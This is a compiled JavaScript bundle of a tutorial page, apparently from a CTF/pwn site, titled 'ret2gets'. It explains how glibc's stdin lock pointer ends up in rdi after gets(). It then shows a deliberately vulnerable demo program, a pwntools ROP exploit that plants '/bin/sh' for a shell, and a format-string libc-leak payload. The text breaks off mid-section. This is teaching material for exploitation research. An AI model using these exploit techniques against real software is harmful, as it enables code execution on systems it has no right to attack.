"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[106],{696:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>r,contentTitle:()=>o,default:()=>a,frontMatter:()=>c,metadata:()=>i,toc:()=>d});const i=JSON.parse('{"id":"pwn/rop-2.34+/ret2gets","title":"ret2gets","description":"Who needs \\"pop rdi\\" when you have gets()","source":"@site/pwn/pwn/rop-2.34+/ret2gets.mdx","sourceDirName":"pwn/rop-2.34+","slug":"/pwn/rop-2.34+/ret2gets","permalink":"/pwn/rop-2.34+/ret2gets","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":2,"frontMatter":{"description":"Who needs \\"pop rdi\\" when you have gets()","sidebar_position":2},"sidebar":"tutorialSidebar","previous":{"title":"The problem","permalink":"/pwn/rop-2.34+/the-problem"},"next":{"title":"Controlling rbp","permalink":"/pwn/rop-2.34+/controlling-rbp"}}');var s=t(4848),l=t(8453);const c={description:'Who needs "pop rdi" when you have gets()',sidebar_position:2},o="ret2gets",r={},d=[{value:"<code>_IO_stdfile_0_lock</code>",id:"io_stdfile_0_lock",level:2},{value:"Sidenote on finding locking functions",id:"sidenote-on-finding-locking-functions",level:3},{value:"<code>_IO_acquire_lock</code>/<code>_IO_release_lock</code>",id:"io_acquire_lock-_io_release_lock",level:3},{value:"<code>_IO_lock_lock</code>/<code>_IO_lock_unlock</code>",id:"io_lock_lock-_io_lock_unlock",level:3},{value:"<code>_IO_stdfile_0_lock</code> in <code>rdi</code>?",id:"io_stdfile_0_lock-in-rdi",level:3},{value:"glibc prior to <code>2.30</code>",id:"glibc-prior-to-2.30",level:3},{value:"Detecting this behaviour",id:"detecting-this-behaviour",level:3},{value:"Exploit techniques",id:"exploit-techniques",level:2},{value:"Controlling <code>rdi</code>",id:"controlling-rdi",level:3},{value:"Leaking libc",id:"leaking-libc",level:3},{value:"printf",id:"printf",level:4},{value:"puts",id:"puts",level:4},{value:"Adjusting for 2.37+",id:"adjusting-for-2.37",level:3},{value:"What if <code>rdi != _IO_stdfile_0_lock</code>?",id:"what-if-rdi-_io_stdfile_0_lock",level:2},{value:"Case 1: <code>rdi</code> is writable",id:"case-1-rdi-is-writable",level:3},{value:"Case 2: <code>rdi</code> is readable",id:"case-2-rdi-is-readable",level:3},{value:"Case 3: <code>rdi == NULL</code>",id:"case-3-rdi-null",level:3},{value:"printf/scanf",id:"printf-scanf",level:4},{value:"fflush",id:"fflush",level:4},{value:"Case 4: <code>rdi</code> is junk",id:"case-4-rdi-is-junk",level:3},{value:"rand",id:"rand",level:4},{value:"getchar/putchar",id:"getchar-putchar",level:4}];function h(e){const n={a:"a",admonition:"admonition",br:"br",code:"code",del:"del",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"ret2gets",children:"ret2gets"})}),"\n",(0,s.jsxs)(n.p,{children:["Ah the ",(0,s.jsx)(n.code,{children:"gets"})," function, a staple of insecure coding and overflow challenges, reading as much data as possible upto a ",(0,s.jsx)(n.code,{children:"\\n"}),". While most people are interested in its unlimited overflow, I'm interested in its applications for ",(0,s.jsx)(n.code,{children:"rdi"})," control, and even libc leaks. What am I talking about you may be asking?"]}),"\n",(0,s.jsx)(n.p,{children:"Well, let's go back to the demo program."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'// gcc demo.c -o demo -no-pie -fno-stack-protector\n#include <stdio.h>\n\nint main() {\n\tchar buf[0x20];\n\tputs("ROP me if you can!");\n\tgets(buf);\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Running this under ",(0,s.jsx)(n.code,{children:"gdb"}),", let's enter any string, and see what happens to the registers after ",(0,s.jsx)(n.code,{children:"gets"}),", because as you probably know, many functions will clobber the argument variables as they have no need to preserve them, and will use them either as scratch registers, or in other function calls (or both!). For ",(0,s.jsx)(n.code,{children:"gets"}),", all we'd need is some writable address to land in ",(0,s.jsx)(n.code,{children:"rdi"}),", then perhaps we could do something?"]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (119).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:'gdb after entering "aaaa"'})})]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (121).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:[(0,s.jsx)("code",{children:"_IO_stdfile_0_lock"})," in memory"]})})]}),"\n",(0,s.jsxs)(n.p,{children:["Bingo! We have a address which appears to exist in libc's ",(0,s.jsx)(n.strong,{children:"writable"})," region, so by calling ",(0,s.jsx)(n.code,{children:"gets"})," again in our rop chain, we could overwrite libc data, perhaps smash some useful structures. However, without a libc leak that could be limited. There could be multiple ways to utilise this, but the one I'm most interested in here is smashing ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"}),"."]}),"\n",(0,s.jsx)(n.h2,{id:"io_stdfile_0_lock",children:(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})}),"\n",(0,s.jsxs)(n.p,{children:["Let's not beat around the bush, glibc's IO is complicated, so much so that there's a whole category related to IO exploitation, called ",(0,s.jsx)(n.code,{children:"FSOP"}),". That won't be the focus here, instead we're looking at what's generally overlooked when it comes to glibc IO: ",(0,s.jsx)(n.strong,{children:"locking"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Because glibc supports multithreading, many glibc functions need to be thread-safe, which means that they're resistant to data racing. This is a problem faced by glibc IO, because multiple threads can use the same ",(0,s.jsx)(n.code,{children:"FILE"})," structures at the same time, so if 2 threads try to use one at the same time, this is called a race condition, and it can break the ",(0,s.jsx)(n.code,{children:"FILE"}),". We fix this using locks."]}),"\n",(0,s.jsxs)(n.p,{children:["If you've ever looked at glibc source code for IO functions (as you do), you may noticed a common pattern with a lot of them (except printf and scanf, as they're more complicated, more on those later). Let's take ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogets.c#L31",children:"gets"})," (2.35 for now):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"char *\n_IO_gets (char *buf)\n{\n  size_t count;\n  int ch;\n  char *retval;\n\n  _IO_acquire_lock (stdin);\n  ch = _IO_getc_unlocked (stdin);\n  if (ch == EOF)\n    {\n      retval = NULL;\n      goto unlock_return;\n    }\n  if (ch == '\\n')\n    count = 0;\n  else\n    {\n      /* This is very tricky since a file descriptor may be in the\n\t non-blocking mode. The error flag doesn't mean much in this\n\t case. We return an error only when there is a new error. */\n      int old_error = stdin->_flags & _IO_ERR_SEEN;\n      stdin->_flags &= ~_IO_ERR_SEEN;\n      buf[0] = (char) ch;\n      count = _IO_getline (stdin, buf + 1, INT_MAX, '\\n', 0) + 1;\n      if (stdin->_flags & _IO_ERR_SEEN)\n\t{\n\t  retval = NULL;\n\t  goto unlock_return;\n\t}\n      else\n\tstdin->_flags |= old_error;\n    }\n  buf[count] = 0;\n  retval = buf;\nunlock_return:\n  _IO_release_lock (stdin);\n  return retval;\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["At the start of the function it uses ",(0,s.jsx)(n.code,{children:"_IO_acquire_lock"}),", and at the end it uses ",(0,s.jsx)(n.code,{children:"_IO_release_lock"}),". The idea is that ",(0,s.jsx)(n.em,{children:"acquiring"})," the lock tells other threads that ",(0,s.jsx)(n.code,{children:"stdin"})," is currently in use, and any other threads that try to access ",(0,s.jsx)(n.code,{children:"stdin"})," will be forced to wait until this thread ",(0,s.jsx)(n.em,{children:"releases"})," the lock, telling other threads that ",(0,s.jsx)(n.code,{children:"stdin"})," is no longer in use."]}),"\n",(0,s.jsxs)(n.p,{children:["For this reason, ",(0,s.jsx)(n.code,{children:"FILE"})," has a field ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/struct_FILE.h#L81",children:"_lock"}),", which is a pointer to a ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L26",children:"_IO_lock_t"})," (stored at offset ",(0,s.jsx)(n.code,{children:"+0x88"}),"):"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"typedef struct {\n    int lock;\n    int cnt;\n    void *owner;\n} _IO_lock_t;\n"})}),"\n",(0,s.jsx)(n.h3,{id:"sidenote-on-finding-locking-functions",children:"Sidenote on finding locking functions"}),"\n",(0,s.jsxs)(n.p,{children:["I had some trouble finding the necessary macros and functions for acquiring and releasing locks, so I'll make a note here. I use ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source",children:"elixir bootlin"})," for reading and searching the glibc code base. When ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/C/ident/_IO_acquire_lock",children:"searching"})," for ",(0,s.jsx)(n.code,{children:"_IO_acquire_lock"}),", we get multiple definitions, which isn't very helpful (same thing for ",(0,s.jsx)(n.code,{children:"_IO_release_lock"}),")."]}),"\n",(0,s.jsxs)(n.p,{children:[" ",(0,s.jsx)(n.img,{src:t(2242).A+"",width:"341",height:"179"})]}),"\n",(0,s.jsx)(n.p,{children:"So which one gets used?"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"sysdeps/htl"}),": This is the ",(0,s.jsx)(n.code,{children:"Hurd version"}),", which would be used on ",(0,s.jsx)(n.a,{href:"https://www.gnu.org/software/hurd/",children:"GNU Hurd"}),". This isn't nearly as common as ",(0,s.jsx)(n.code,{children:"GNU Linux"}),", so we can ignore this one."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"sysdeps/generic"}),": Like the name suggests, this is designed to work anywhere which doesn't have a specific definition, like a fallback. This isn't used in our case."]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.code,{children:"libio/libioP.h"}),": Seems to be ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L887",children:"another fallback"}),", in a specific case at least, when ",(0,s.jsx)(n.code,{children:"_IO_MTSAFE_IO"})," isn't defined. If these were used, no locking is done at all, so this implies this is when we don't care about thread safety.",(0,s.jsx)(n.br,{}),"\n","In our case ",(0,s.jsx)(n.code,{children:"_IO_MTSAFE_IO"})," is set, so we can ignore this."]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["The correct one is ",(0,s.jsx)(n.code,{children:"sysdeps/nptl"}),", otherwise known as ",(0,s.jsx)(n.code,{children:"Native POSIX Threads Library"}),"."]}),"\n",(0,s.jsxs)(n.h3,{id:"io_acquire_lock-_io_release_lock",children:[(0,s.jsx)(n.code,{children:"_IO_acquire_lock"}),"/",(0,s.jsx)(n.code,{children:"_IO_release_lock"})]}),"\n",(0,s.jsxs)(n.p,{children:["These macros are ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L88",children:"defined"})," as follows:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"#  define _IO_acquire_lock(_fp) \\\n  do {\t\t\t\t\t\t\t\t\t      \\\n    FILE *_IO_acquire_lock_file\t\t\t\t\t\t      \\\n\t__attribute__((cleanup (_IO_acquire_lock_fct)))\t\t\t      \\\n\t= (_fp);\t\t\t\t\t\t\t      \\\n    _IO_flockfile (_IO_acquire_lock_file);\n# else\n#  ...\n# endif\n# define _IO_release_lock(_fp) ; } while (0)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["This may look confusing, but the 2 important functions to take away from this are ",(0,s.jsx)(n.code,{children:"_IO_flockfile"})," and ",(0,s.jsx)(n.code,{children:"_IO_acquire_lock_fct"}),". The ",(0,s.jsx)(n.code,{children:"__attribute__((cleanup))"})," maybe look bizarre, but all it does is call ",(0,s.jsx)(n.code,{children:"_IO_acquire_lock_fct"})," on ",(0,s.jsx)(n.code,{children:"_fp"})," when the end of the artificial ",(0,s.jsx)(n.code,{children:"do-while(0)"})," block is over (basically at the end of the IO function). ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L880",children:"_IO_acquire_lock_fct"})," is defined as:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"static inline void\n__attribute__ ((__always_inline__))\n_IO_acquire_lock_fct (FILE **p)\n{\n  FILE *fp = *p;\n  if ((fp->_flags & _IO_USER_LOCK) == 0)\n    _IO_funlockfile (fp);\n}\n"})}),"\n",(0,s.jsxs)(n.p,{children:["So really from this, the 2 macros for locking and unlocking are ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L282",children:"_IO_flockfile"})," and ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libio.h#L284",children:"_IO_funlockfile"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"# define _IO_flockfile(_fp) \\\n  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)->_lock)\n# define _IO_funlockfile(_fp) \\\n  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)->_lock)\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"_IO_USER_LOCK=0x8000"})," is a macro which seems to indicate whether or not the inbuilt locking should be used or not. This is usually used internally, like in helper streams in ",(0,s.jsx)(n.code,{children:"printf"})," for example. For our purposes we can ignore this, as this check will always pass for ",(0,s.jsx)(n.code,{children:"stdin"})," (or any of the standard streams for that matter). Finally we get to the macros that we care about: ",(0,s.jsx)(n.code,{children:"_IO_lock_lock"})," and ",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"}),"."]}),"\n",(0,s.jsxs)(n.h3,{id:"io_lock_lock-_io_lock_unlock",children:[(0,s.jsx)(n.code,{children:"_IO_lock_lock"}),"/",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"})]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L37",children:"_IO_lock_lock"})," and ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/nptl/stdio-lock.h#L67",children:"_IO_lock_unlock"})," are defined as:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:"#define _IO_lock_lock(_name) \\\n  do {\t\t\t\t\t\t\t\t\t      \\\n    void *__self = THREAD_SELF;\t\t\t\t\t\t      \\\n    if ((_name).owner != __self)\t\t\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n\tlll_lock ((_name).lock, LLL_PRIVATE);\t\t\t\t      \\\n        (_name).owner = __self;\t\t\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n    ++(_name).cnt;\t\t\t\t\t\t\t      \\\n  } while (0)\n\n#define _IO_lock_unlock(_name) \\\n  do {\t\t\t\t\t\t\t\t\t      \\\n    if (--(_name).cnt == 0)\t\t\t\t\t\t      \\\n      {\t\t\t\t\t\t\t\t\t      \\\n        (_name).owner = NULL;\t\t\t\t\t\t      \\\n\tlll_unlock ((_name).lock, LLL_PRIVATE);\t\t\t\t      \\\n      }\t\t\t\t\t\t\t\t\t      \\\n  } while (0)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Note that ",(0,s.jsx)(n.code,{children:"_name"})," is the lock itself, and in the case of ",(0,s.jsx)(n.code,{children:"gets"}),", is ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Let's break this down. The ",(0,s.jsx)(n.code,{children:"owner"})," field stores the address of ",(0,s.jsx)(n.code,{children:"TLS"})," (Thread Local Storage) structure for the thread currently using the lock (if you're wondering what the ",(0,s.jsx)(n.code,{children:"TLS"})," structure is, it's the structure whose address is stored in the ",(0,s.jsx)(n.code,{children:"fs"})," register; it also stores the canary, and you've likely seen ",(0,s.jsx)(n.code,{children:"fs:[0x28]"})," in disassembly). So when locking, if the ",(0,s.jsx)(n.code,{children:"owner"})," is different to ",(0,s.jsx)(n.code,{children:"THREAD_SELF"})," (i.e. lock is owned by a different thread), it waits until that thread has ",(0,s.jsx)(n.em,{children:"unlocked"})," using ",(0,s.jsx)(n.code,{children:"lll_lock"}),", then claims ownership of the lock. When unlocking, it removes its ownership, and signals that it's no longer in use with ",(0,s.jsx)(n.code,{children:"lll_unlock"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["The use of ",(0,s.jsx)(n.code,{children:"cnt"})," is a bit bizarre to me. The only way I could see this being useful is if the same thread had to use the lock multiple times, perhaps due to recursive(?) calls. Perhaps it's just a flexibility thing, I'm not sure. But what I can tell you is that this will be useful for us in a moment ;)"]}),"\n",(0,s.jsxs)(n.h3,{id:"io_stdfile_0_lock-in-rdi",children:[(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," in ",(0,s.jsx)(n.code,{children:"rdi"}),"?"]}),"\n",(0,s.jsx)(n.p,{children:"You may be wondering why this happens, and while this is slightly bizarre, I can give an educated guess."}),"\n",(0,s.jsxs)(n.p,{children:["For one thing, ",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"})," is what's called at the very end of most IO functions, including ",(0,s.jsx)(n.code,{children:"gets"}),", so its effects on the registers are the most recent before returning, with nothing afterwards clobbering the registers."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (123).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"gets+131"})})})]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (124).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"_IO_lock_unlock"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["Above is the disassembly of ",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"}),". ",(0,s.jsx)(n.code,{children:"rbp"})," stores the address of ",(0,s.jsx)(n.code,{children:"stdin"}),", so ",(0,s.jsx)(n.code,{children:"+182"})," is checking ",(0,s.jsx)(n.code,{children:"_IO_USER_LOCK"}),". But then look at ",(0,s.jsx)(n.code,{children:"+191"}),". Recall that ",(0,s.jsx)(n.code,{children:"_lock"})," is stored at an offset of ",(0,s.jsx)(n.code,{children:"+0x88"}),", so this must be loading ",(0,s.jsx)(n.code,{children:"stdin._lock"}),", which as we know is ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"}),", and we see that it's loading into ",(0,s.jsx)(n.code,{children:"rdi"}),"! Then pretty soon afterwards it returns, without clobbering ",(0,s.jsx)(n.code,{children:"rdi"})," (",(0,s.jsx)(n.code,{children:"__lll_lock_wait_private"})," doesn't clobber it either, it's just a thin wrapper around the ",(0,s.jsx)(n.code,{children:"futex"})," syscall)."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (125).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsx)("p",{children:(0,s.jsx)("code",{children:"__lll_lock_wait_private"})})})]}),"\n",(0,s.jsxs)(n.p,{children:["So that's where ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," comes from, but ",(0,s.jsx)(n.del,{children:"where did it go?"})," ",(0,s.jsx)(n.em,{children:"why"})," does ",(0,s.jsx)(n.code,{children:"_lock"})," get loaded into ",(0,s.jsx)(n.code,{children:"rdi"}),"?"]}),"\n",(0,s.jsxs)(n.p,{children:["That's a good question, to which my best guess would be that it's an optimization made by the compiler. In the case where ",(0,s.jsx)(n.code,{children:"lll_unlock"})," is called, the address of ",(0,s.jsx)(n.code,{children:"_lock"})," is passed directly to the ",(0,s.jsx)(n.code,{children:"futex"})," wrapper as the one and only argument (i.e. through the ",(0,s.jsx)(n.code,{children:"rdi"})," register). Therefore it loads ",(0,s.jsx)(n.code,{children:"_lock"})," into ",(0,s.jsx)(n.code,{children:"rdi"})," so that it doesn't need to use an extra assignment to prepare the call to ",(0,s.jsx)(n.code,{children:"futex"})," like ",(0,s.jsx)(n.code,{children:"mov rdi, [register containing _lock]"}),", which saves space and time."]}),"\n",(0,s.jsxs)(n.h3,{id:"glibc-prior-to-2.30",children:["glibc prior to ",(0,s.jsx)(n.code,{children:"2.30"})]}),"\n",(0,s.jsxs)(n.p,{children:["While we're mainly looking at ",(0,s.jsx)(n.code,{children:"2.34+"}),", let's have a brief look at versions prior to that. It appears that prior to ",(0,s.jsx)(n.code,{children:"2.30"}),", the disassembly looks a bit different. For example, the following is from ",(0,s.jsx)(n.code,{children:"2.29"}),"."]}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (127).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:["2.29 ",(0,s.jsx)("code",{children:"_IO_lock_unlock"})]})})]}),"\n",(0,s.jsxs)(n.p,{children:["Instead of loading it into ",(0,s.jsx)(n.code,{children:"rdi"}),", it loads it into ",(0,s.jsx)(n.code,{children:"rdx"}),", then later into ",(0,s.jsx)(n.code,{children:"rdi"})," just for the ",(0,s.jsx)(n.code,{children:"futex"})," call? And what's going on around the call to ",(0,s.jsx)(n.code,{children:"__lll_unlock_wake_private"})," with ",(0,s.jsx)(n.code,{children:"rsp"}),"? This seems like a bizarre choice for the compiler to make, and the reason for that is that this part is ",(0,s.jsx)(n.a,{href:"https://elixir.bootlin.com/glibc/glibc-2.29/source/sysdeps/unix/sysv/linux/x86_64/lowlevellock.h#L195",children:"written in assembly"}),". I couldn't tell you why, but what I can say is that this causes problems for us, as ",(0,s.jsx)(n.code,{children:"_lock"})," only gets loaded into ",(0,s.jsx)(n.code,{children:"rdi"})," under very specific cirumstances, which hinders our potential techniques."]}),"\n",(0,s.jsx)(n.h3,{id:"detecting-this-behaviour",children:"Detecting this behaviour"}),"\n",(0,s.jsxs)(n.p,{children:["For fun, I decided to write a ",(0,s.jsx)(n.a,{href:"https://gist.github.com/sasha-999/1dcc54e932e59975da82b14691febc38",children:"python script"})," which uses ",(0,s.jsx)(n.code,{children:"angr"})," that can detect this behaviour automatically, for a given libc."]}),"\n",(0,s.jsxs)(n.p,{children:["The libc doesn't require debug symbols, and the script should work for ",(0,s.jsx)(n.code,{children:"2.23-2.39"}),", as these were the versions I tested (",(0,s.jsx)(n.code,{children:"2.39"})," is the most recent version as of writing this)."]}),"\n",(0,s.jsx)(n.h2,{id:"exploit-techniques",children:"Exploit techniques"}),"\n",(0,s.jsxs)(n.p,{children:["Now for the fun stuff. I'm gonna show you a few simple techniques which can help you with your ropping, one for controlling ",(0,s.jsx)(n.code,{children:"rdi"})," and another for leaking libc."]}),"\n",(0,s.jsx)(n.p,{children:"I'll demonstrate these using the demo program, which is patched to run using glibc 2.35 (that'll be important later)."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.a,{target:"_blank","data-noBrokenLinkCheck":!0,href:t(1794).A+"",children:"demo.zip"})}),"\n",(0,s.jsxs)(n.h3,{id:"controlling-rdi",children:["Controlling ",(0,s.jsx)(n.code,{children:"rdi"})]}),"\n",(0,s.jsxs)(n.p,{children:["One idea you may have already had is that, since ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," always ends up in ",(0,s.jsx)(n.code,{children:"rdi"})," after a call to ",(0,s.jsx)(n.code,{children:"gets"}),", and ",(0,s.jsx)(n.code,{children:"gets"})," allows us to write arbitrary data to a pointer in ",(0,s.jsx)(n.code,{children:"rdi"}),", then surely we can just write ",(0,s.jsx)(n.code,{children:"/bin/sh"})," to ",(0,s.jsx)(n.code,{children:"_IO_stdfile_lock"}),", right?"]}),"\n",(0,s.jsx)(n.p,{children:"If you were thinking that, then good job, because you're correct, we can!"}),"\n",(0,s.jsxs)(n.p,{children:["Since ",(0,s.jsx)(n.code,{children:"rdi -> _IO_stdfile_0_lock"}),", another call to ",(0,s.jsx)(n.code,{children:"gets"})," will write data there. Then we'd send ",(0,s.jsx)(n.code,{children:"/bin/sh"}),", and then that 2nd call to ",(0,s.jsx)(n.code,{children:"gets"})," will return ",(0,s.jsx)(n.code,{children:'_IO_stdfile_0_lock -> "/bin/sh"'})," in ",(0,s.jsx)(n.code,{children:"rdi"}),". This would get around needing to use ",(0,s.jsx)(n.code,{children:"pop rdi ; ret"})," to get a pointer to ",(0,s.jsx)(n.code,{children:"/bin/sh"}),", so if you had ",(0,s.jsx)(n.code,{children:"system"})," available, then you could get a shell!"]}),"\n",(0,s.jsxs)(n.p,{children:["One important thing to note is that after we overwrite the lock, ",(0,s.jsx)(n.code,{children:"_IO_lock_unlock"})," will be executed before we return. This will decrement ",(0,s.jsx)(n.code,{children:"cnt"}),", and if the new ",(0,s.jsx)(n.code,{children:"cnt"})," is ",(0,s.jsx)(n.code,{children:"0"}),", then ",(0,s.jsx)(n.code,{children:"lll_unlock"})," will clobber our data! This is why it's important to overwrite ",(0,s.jsx)(n.code,{children:"cnt"})," to a value other than ",(0,s.jsx)(n.code,{children:"1"}),", and we have to adjust that value to be ",(0,s.jsx)(n.code,{children:"+1"})," more than what we want. The code for this would be as follows:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'from pwn import *\n\ne = context.binary = ELF(\'demo\')\np = e.process()\n\npayload  = b"A" * 0x20\npayload += p64(0)\t# saved rbp\npayload += p64(e.plt.gets)\n\np.sendlineafter(b"ROP me if you can!\\n", payload)\n\ngdb.attach(p)\np.sendline(b"/bin" + p8(u8(b"/")+1) + b"sh")\n\np.interactive()\n'})}),"\n",(0,s.jsxs)("figure",{children:[(0,s.jsx)("img",{alt:"",src:"/assets/image (118).png"}),(0,s.jsx)("figcaption",{children:(0,s.jsxs)("p",{children:[(0,s.jsx)("code",{children:"rdi"})," control!"]})})]}),"\n",(0,s.jsxs)(n.p,{children:["While this will of course ",(0,s.jsx)(n.code,{children:"SEGFAULT"}),", we see our desired result of ",(0,s.jsx)(n.code,{children:'rdi -> "/bin/sh"'}),"!"]}),"\n",(0,s.jsxs)(n.p,{children:["Another thing to note is that ",(0,s.jsx)(n.code,{children:"/bin/sh"})," will remain in ",(0,s.jsx)(n.code,{children:"_IO_stdfile_0_lock"})," until we change it back, so after any subequent calls to ",(0,s.jsx)(n.code,{children:"gets"}),", we'll get back this pointer to ",(0,s.jsx)(n.code,{children:"/bin/sh"}),". Because even though the locking will increment the ",(0,s.jsx)(n.code,{children:"cnt"}),", it will leave the rest of the contents alone, then unlocking will decrement it back."]}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsxs)(n.p,{children:["This relies on being able to skip over ",(0,s.jsx)(n.code,{children:"lll_unlock"})," by having a large value for ",(0,s.jsx)(n.code,{children:"cnt"}),"."]}),(0,s.jsxs)(n.p,{children:["But for ",(0,s.jsx)(n.code,{children:"2.29"})," and prior, it only loads ",(0,s.jsx)(n.code,{children:"_lock"})," into ",(0,s.jsx)(n.code,{children:"rdi"})," when calling ",(0,s.jsx)(n.code,{children:"lll_unlock"}),", so this won't work as ",(0,s.jsx)(n.code,{children:"rdi"})," won't end up pointing to ",(0,s.jsx)(n.code,{children:'_IO_stdfile_0_lock -> "/bin/sh"'}),"."]})]}),"\n",(0,s.jsx)(n.admonition,{type:"info",children:(0,s.jsxs)(n.p,{children:["I also found out that I'm not the first person to discover this, ",(0,s.jsx)(n.a,{href:"https://app.hackthebox.com/users/70668",children:"w3th4nds"})," beat me to it with the challenge ",(0,s.jsx)(n.a,{href:"https://github.com/hackthebox/cyber-apocalypse-2024/tree/main/pwn/%5BMedium%5D%20Sound%20of%20Silence",children:"Sound of Silence"}),", and I wouldn't be surprised if it's been found/used before then, I just hadn't seen it before writing this."]})}),"\n",(0,s.jsx)(n.h3,{id:"leaking-libc",children:"Leaking libc"}),"\n",(0,s.jsxs)(n.p,{children:["There are a few ways you can leak libc using ",(0,s.jsx)(n.code,{children:"gets"}),"."]}),"\n",(0,s.jsx)(n.h4,{id:"printf",children:"printf"}),"\n",(0,s.jsxs)(n.p,{children:["For one, if you have access to ",(0,s.jsx)(n.code,{children:"printf"}),", then you can just use the trick above to enter a format string and then call ",(0,s.jsx)(n.code,{children:"printf"}),"."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:'p.sendline(b"%69$" + p8(u8(b"p")+1))\n'})}),"\n",(0,s.jsx)(n.p,{children:"Another benefit of this is we can leak more than just libc: as long as it's on the stack, after our ROP chain, it's leakable!"}),"\n",(0,s.jsx)(n.h4,{id:"puts",children:"puts"}),"\n",(0,s.jsxs)(n.p,{children:["But what if you don't have ",(0,s.jsx)(n.code,{children:"printf"}),", and instead have only ",(0,s.jsx)(n.code,{children:"puts"}),"? Well fear not, because we have another trick up our sleeves: ",(0,s.jsx)(n.code,{children:"_lock.owner"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["Recall the ",(0,s.jsx)(n.code,{children:"_IO_lock_t"})," 